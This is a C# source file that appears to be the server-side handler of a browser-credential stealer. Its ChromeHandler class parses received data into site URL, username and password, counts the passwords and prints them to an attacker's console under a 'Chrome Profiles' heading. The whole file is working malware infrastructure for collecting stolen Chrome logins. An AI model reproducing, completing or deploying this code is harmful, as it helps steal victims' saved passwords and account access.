using System;
using System.Threading;
using PS03.Network.Receive.PostOp;

namespace PS03.Network.Receive.Handlers
{
    public class ChromeHandler
    {
        private bool first = true;
        private readonly Mutex mtx = new Mutex();
        private readonly PasswordCounter pwc;

        public ChromeHandler(PasswordCounter PWC)
        {
            pwc = PWC;
        }

        public void Handle(string data)
        {
            var actMark = 0;
            var usrMark = 0;
            var pasMark = 0;

            actMark = data.IndexOf("ACTION=") + ("ACTION=").Length;
            usrMark = data.IndexOf("USER=");
            pasMark = data.IndexOf("PASS=");

            var Action = data.Substring(actMark, usrMark - actMark);

            var User = data.Substring(usrMark + ("USER=").Length, pasMark - (usrMark + ("USER=").Length));

            var Password = data.Substring(pasMark + ("PASS=").Length, data.Length - (pasMark + ("PASS=").Length));
            pwc.Add(Password);
            Print(Action, User, Password);
        }

        private void Print(string action, string user, string pass)
        {
            mtx.WaitOne();
            if (first)
            {
                Console.WriteLine();
                printCenterWhite("# ---------------------- Chrome Profiles ---------------------- #");
            }
            first = false;

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("URL:\t\t");
            printRed(action);
            Console.Write("Username:\t");
            printRed(user);
            Console.Write("Password:\t");
            printRed(pass);
            //   printCenterRed("# ---------------------- #");


            Console.ResetColor();
            mtx.ReleaseMutex();
        }

        private void printRed(string data)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(data);
            Console.ForegroundColor = ConsoleColor.Green;
        }

        private void printCenterWhite(string data)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.SetCursorPosition((Console.WindowWidth - data.Length)/2, Console.CursorTop);
            Console.WriteLine(data);
            Console.ForegroundColor = ConsoleColor.Green;
        }
    }
}